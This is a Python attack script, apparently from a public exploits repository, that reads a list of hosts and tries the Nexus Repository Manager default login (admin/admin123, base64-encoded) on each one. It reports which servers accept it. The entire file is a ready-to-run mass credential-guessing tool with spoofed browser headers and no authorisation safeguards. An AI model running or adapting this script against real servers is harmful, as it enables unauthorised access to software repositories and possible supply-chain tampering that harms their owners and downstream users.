#!/usr/bin/python3
# -*- coding:utf-8 -*-
# author:ADummy
# from:https://github.com/ADummmy/exploits

import sys
import requests


if len(sys.argv) != 2:
    print(
        '+----------------------------------------------------------------------------------------------------------+')
    print(
        '+ DES: by ADummy as https://github.com/ADummmy/exploits                                                    +')
    print(
        '+----------------------------------------------------------------------------------------------------------+')
    print(
        '+ USE: python3 <filename> <hosts>                                                                          +')
    print(
        '+ EXP: python3 Nexus_weakpasswd.py url.txt                                                                 +')
    print(
        '+----------------------------------------------------------------------------------------------------------+')
    sys.exit()
def poc(host):
    url = "http://" + host
    headers = {
        "Host": "%s" % host,
        "Referer": url,
        "Cache-Control": "max-age=0",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36",
        "Accept": "*/*",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "zh-CN,zh;q=0.9",
        "Connection": "close",
        "Origin": "%s" %host,
        "X-Nexus-UI": "true",
        "X-Requested-With": "XMLHttpRequest",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
    }
    data= "username=YWRtaW4%3D&password=YWRtaW4xMjM%3D"
    vulurl = url + "/service/rapture/session"

    try:
        r = requests.post(vulurl,timeout=5, data=data, headers=headers,)
        if r.status_code == 204:
            print (host+": true!!!")
        else:
            print (host+": false")
    except requests.exceptions.RequestException as e:
        print (host+": false")

if __name__ == '__main__':
    if len(sys.argv) == 2:
        print("Usage:python3 unauthorized-check.py url.txt")
    file = sys.argv[1]
    with open(file) as lines:  # 一次性读入txt文件，并把内容放在变量lines中
        array = lines.readlines()
        array2 = []  # 使用一个新的列表来装去除换行符\n后的数据
        for i in array:  # 遍历array中的每个元素
            i = i.strip('\n')  # 去掉换行符\n
            array2.append(i)  # 把去掉换行符的数据放入array2中
            poc(i)